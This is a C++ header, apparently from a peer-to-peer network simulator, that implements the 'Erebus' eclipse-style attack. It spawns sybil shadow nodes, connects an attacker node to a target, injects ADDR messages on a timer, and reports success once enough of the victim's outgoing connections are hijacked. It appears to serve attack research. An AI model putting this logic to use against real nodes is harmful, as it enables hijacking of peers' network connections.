#ifndef EREBUS_ATTACK_POLICY_H
#define EREBUS_ATTACK_POLICY_H

#include <list>

#include "../node/BenignNode.h"
#include "../node/ShadowActiveNode.h"
#include "../node/ShadowNode.h"
#include "utility/AttackStat.h"

#include "../ipdb/IPDatabase.h"

using namespace std;

namespace libBLEEP_sybil {

    template<class NodePrimitives, class NodeParams>
    class ErebusAttackPolicy {

    public:
        ErebusAttackPolicy() : libev_loop(EV_DEFAULT) {
            _checkWatcher.set<ErebusAttackPolicy, &ErebusAttackPolicy<NodePrimitives, NodeParams>::_checkAttack>(
                    this);
            _checkWatcher.start();
        }

        // step 1. construct virtual network using sybil nodes
        bool ConstructSybilNet(IPDatabase &ipdb, std::string targetIP,
                               int targetPort) {
            vector<pair<string, int>> &vReachableIP = ipdb.GetVReachableIP();
            vector<string> &vAttackerIP = ipdb.GetVAttackerIP();
            vector<string> &vShadowIP = ipdb.GetVShadowIP();


            // Spawn network consisting of 100,000 benign nodes
            int ipCount = 0;
            for (auto &[ip, uptime] : vReachableIP) {
                auto &benignNode = _benignNodes.emplace_back(&_attackStat, &ipdb, ip, 8333);

                // set a churnout timer for all the benign nodes
                benignNode.SetChurnOutTimer(uptime);

                ipCount++;
                if (ipCount >= 100000)
                    break;
            }
            std::cout << "benign node objects are constructed" << "\n";

            // Spawn network consisting of sybil nodes
            for (auto ip : vShadowIP) {
                _shadowNodes.emplace_back(&_attackStat, &ipdb, ip, 8333);
            }

            // Spawn attacker node
            assert(vAttackerIP.size() > 0);
            _attackerNode = make_unique<ShadowActiveNode<NodePrimitives>>(&_attackStat, &ipdb, vAttackerIP[0]);

            // Let attacker node to connect to the target
            _attackerNode->tryConnectToTarget(targetIP, targetPort, 1);

            // Let attacker node to periodically call ADDR injection API
            _addrInjectTimer.set<ErebusAttackPolicy, &ErebusAttackPolicy::_timercb>(this);
            _addrInjectTimer.set(NodeParams::addrInjectionStartTime, NodeParams::addrInjectionDelay);
            _addrInjectTimer.start();


            return true;
        }


    private:
        void _timercb(ev::timer &w, int revents) {
            _attackerNode->OpAddrInjectionTimeout(NodeParams::preparePhaseTimeLength, NodeParams::addrInjectionDelay,
                                                  NodeParams::addrInjectionIPPerSec,
                                                  NodeParams::addrInjectionShadowRate);
            _attackerNode->UpdateDataSocketWatcher();
        }

        ev::timer _addrInjectTimer;

    private:
        list <BenignNode<NodePrimitives>> _benignNodes;
        list <ShadowNode<NodePrimitives>> _shadowNodes;
        unique_ptr<ShadowActiveNode<NodePrimitives>> _attackerNode;

        AttackStat _attackStat;

    private:
        void _checkAttack() {
            // If we hijacked victim's incoming connection more than predefined target number,
            // it means that attack is successful, so break the main loop.
            if (_attackStat.GetHijackedOutgoingConnNum() >= NodeParams::targetOutgoingConnNum) {
                std::cout << "The EREBUS attack is succeeded." << "\n";
                std::cout << "Pre-defined target outgoing connection num = " << NodeParams::targetOutgoingConnNum
                          << "\n";
                std::cout << "Hijacked outgoing connection num = " << _attackStat.GetHijackedOutgoingConnNum() << "\n";
                ev_break(libev_loop);
            }
        }

    protected:
        struct ev_loop *libev_loop = nullptr;
        ev::check _checkWatcher;
    };
}

#endif
